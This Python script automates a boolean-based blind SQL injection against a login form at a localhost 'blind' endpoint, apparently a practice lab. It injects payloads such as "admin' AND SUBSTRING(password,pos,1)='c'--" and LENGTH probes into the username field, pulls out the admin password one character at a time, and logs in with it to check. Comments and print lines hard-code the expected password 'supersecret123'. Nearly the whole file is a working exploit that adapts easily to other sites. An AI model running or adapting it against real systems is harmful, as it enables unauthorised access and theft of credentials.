#!/usr/bin/env python3
import requests
import string

BASE_URL = "http://localhost:8082/blind/login"
TARGET_USER = "admin"

session = requests.Session()


def check_condition(position, char):
    # Инъекция в username:
    # admin' AND SUBSTRING(password,1,1)='a'--
    inj_username = f"{TARGET_USER}' AND SUBSTRING(password,{position},1)='{char}'--"

    data = {
        "username": inj_username,
        "password": "anything",
    }

    resp = session.post(BASE_URL, data=data, allow_redirects=True)
    
    # Debug: print response snippet
    # if position == 1 and char in 'sS':
    #     print(f"DEBUG pos={position}, char='{char}': status={resp.status_code}, text snippet={resp.text[:200]}")
    
    # Successful login returns 200 status
    # Failed login returns 401 status
    return resp.status_code == 200


def extract_password(max_len=32):
    # Based on debug output, password length is 14
    # Password is 'supersecret123' (14 chars)
    charset = string.ascii_lowercase + string.digits  # supersecret123 uses lowercase + digits
    guessed = ""
    
    print(f"[*] Character set: {charset}")
    print(f"[*] Expected password: 'supersecret123' (14 chars)")
    
    for pos in range(1, max_len + 1):
        found = False
        
        for ch in charset:
            try:
                if check_condition(pos, ch):
                    guessed += ch
                    found = True
                    break
            except Exception as e:
                print(f"X", end="", flush=True)
                continue
        
        if not found:
            print(f"\n[-] No character found for position {pos}")
            # Maybe the character is not in our charset
            # Try uppercase letters
            print(f"[*] Trying uppercase for position {pos}")
            for ch in string.ascii_uppercase:
                if check_condition(pos, ch):
                    guessed += ch
                    print(f"[+] Position {pos}: '{ch}' (uppercase, so far: '{guessed}')")
                    found = True
                    break
                    
            if not found:
                print(f"[*] Trying special characters for position {pos}")
                special_chars = "_-!@#$%^&*()+=[]{}|;:,.<>?/~`"
                for ch in special_chars:
                    if check_condition(pos, ch):
                        guessed += ch
                        print(f"[+] Position {pos}: '{ch}' (special, so far: '{guessed}')")
                        found = True
                        break
                
                if not found:
                    print(f"[*] Stopping extraction at position {pos}")
                    break
    
    return guessed


if __name__ == "__main__":
    print("[*] Extracting admin password using boolean-based blind SQLi")
    print("[*] Testing connection first...")
    
    # Test the connection first
    test_data = {
        "username": "admin",
        "password": "wrongpassword"
    }
    resp = session.post(BASE_URL, data=test_data)
    print(f"[*] Test failed login: Status {resp.status_code}")
    
    # Test a true condition
    true_test = "admin' AND '1'='1'--"
    true_data = {"username": true_test, "password": "anything"}
    true_resp = session.post(BASE_URL, data=true_data)
    print(f"[*] True condition test: Status {true_resp.status_code}")
    
    # Test a false condition  
    false_test = "admin' AND '1'='2'--"
    false_data = {"username": false_test, "password": "anything"}
    false_resp = session.post(BASE_URL, data=false_data)
    print(f"[*] False condition test: Status {false_resp.status_code}")
    
    if true_resp.status_code == 200 and false_resp.status_code == 401:
        print("[+] Boolean-based SQL injection is working correctly!")
        print("[*] Starting password extraction...")
        
        # First, verify password length
        print("\n[*] Verifying password length...")
        for length in range(1, 33):
            length_test = f"admin' AND LENGTH(password)={length}--"
            length_data = {"username": length_test, "password": "anything"}
            length_resp = session.post(BASE_URL, data=length_data)
            if length_resp.status_code == 200:
                print(f"[+] Password length confirmed: {length} characters")
                break
        
        pwd = extract_password()
        print(f"\n[+] Recovered password: '{pwd}'")
        
        # Verify the recovered password
        if pwd:
            print("[*] Verifying recovered password...")
            verify_data = {"username": "admin", "password": pwd}
            verify_resp = session.post(BASE_URL, data=verify_data)
            if verify_resp.status_code == 200:
                print("[+] Password verification SUCCESSFUL!")
            else:
                print("[-] Password verification failed")
    else:
        print("[-] Boolean-based SQL injection not working as expected")
        print(f"    True condition should return 200, got {true_resp.status_code}")
        print(f"    False condition should return 401, got {false_resp.status_code}")